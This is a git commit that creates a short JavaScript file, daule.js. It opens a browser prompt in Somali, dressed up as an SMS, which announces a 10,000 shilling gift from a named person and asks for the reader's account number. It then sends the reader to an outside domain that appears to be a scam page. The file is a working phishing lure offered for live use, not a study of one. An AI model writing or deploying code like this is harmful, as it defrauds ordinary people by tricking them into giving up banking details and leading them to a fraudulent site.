519c9e512421141fc31f6b57ceb12e5502ddfcda
The-ongoing <preciousadaowo4@gmail.com>
2026-07-20 23:18:53 +0100

    Create daule.js

---
+++ daule.js
@@ -0,0 +1,5 @@
+var password = 'LA BAX Sl.Sh. 10,000'
+password=prompt('SMS: Hambalyo, waxaad u qalantaa inaad hesho Sl.Sh. 10,000 oo ka timid Abdirashid Duale, guji OK si aad u geliso Lambarka Akoonkaaga','LA BAX Sl.Sh. 10,000');
+if (password != 'LA BAX Sl.Sh. 10,000') {
+location.href='https://ongoing-grant.cfd/10000-Abdirashid-Duale.html';
+}
